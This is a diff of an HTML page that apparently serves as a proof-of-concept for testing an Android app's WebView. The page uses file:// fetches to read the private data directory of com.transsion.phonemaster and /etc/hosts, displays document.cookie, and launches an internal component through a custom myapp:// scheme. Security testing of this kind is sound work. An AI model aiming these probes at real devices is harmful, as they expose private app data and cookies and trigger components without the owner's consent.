@@ -1,17 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Launch Android Component</title>
-    <script>
-        function launchComponent(componentName) {
-            const url = `myapp://launch?component=${componentName}`;
-            window.location.href = url; // 触发 Intent
-        }
-    </script>
+    <title>Internal Browser Test</title>
 </head>
 <body>
-    <h2>Launch Component Example</h2>
-    <button onclick="launchComponent('com.cyin.himgr.widget.activity.DragDropActivity')">Launch DragDropActivity</button>
-    <button onclick="launchComponent('com.cyin.himgr.repeatfile.RepeatFileActivity')">Launch RepeatFileActivity</button>
+    <h2>WebView and Local File Access Test</h2>
+    
+    <!-- 显示内置 WebView 版本 -->
+    <div>
+        <h3>WebView Version:</h3>
+        <pre id="webview-version">Loading...</pre>
+        <button onclick="getWebViewVersion()">Get WebView Version</button>
+    </div>
+    
+    <!-- 读取 com.transsion.phonemaster 应用的数据 -->
+    <div>
+        <h3>Application Data (com.transsion.phonemaster):</h3>
+        <pre id="app-data">Loading...</pre>
+        <button onclick="getAppData()">Read App Data</button>
+    </div>
+    
+    <!-- 读取 /etc/hosts 文件内容 -->
+    <div>
+        <h3>/etc/hosts File Content:</h3>
+        <pre id="hosts-content">Loading...</pre>
+        <button onclick="readHostsFile()">Read /etc/hosts</button>
+    </div>
+
+    <!-- 启动目标组件 -->
+    <div>
+        <h3>Launch Target Component:</h3>
+        <button onclick="launchComponent()">Launch Component</button>
+    </div>
+
+    <!-- 加载所有存储的 Cookie -->
+    <div>
+        <h3>Cookies:</h3>
+        <pre id="cookies">Loading...</pre>
+        <button onclick="getCookies()">Show Cookies</button>
+    </div>
+
+    <script>
+        // 读取 WebView 版本
+        function getWebViewVersion() {
+            const version = navigator.userAgent;
+            document.getElementById("webview-version").innerText = version;
+        }
+
+        // 读取应用数据 (示例)
+        function getAppData() {
+            // 假设从一个特定的路径读取应用数据
+            // 实际环境中，这里可能需要不同的访问方式
+            fetch("file:///data/data/com.transsion.phonemaster/app_data")
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById("app-data").innerText = data;
+                })
+                .catch(err => {
+                    document.getElementById("app-data").innerText = "Unable to read app data: " + err;
+                });
+        }
+
+        // 读取 /etc/hosts 文件
+        function readHostsFile() {
+            fetch("file:///etc/hosts")
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById("hosts-content").innerText = data;
+                })
+                .catch(err => {
+                    document.getElementById("hosts-content").innerText = "Unable to read /etc/hosts: " + err;
+                });
+        }
+
+        // 启动目标组件
+        function launchComponent() {
+            const intentUrl = "myapp://com.transsion.widget.WidgetJunkJobService"; // 替换为实际的 URL
+            window.location.href = intentUrl;
+        }
+
+        // 获取 Cookie
+        function getCookies() {
+            const cookies = document.cookie;
+            document.getElementById("cookies").innerText = cookies || "No cookies found";
+        }
+    </script>
 </body>
 </html>
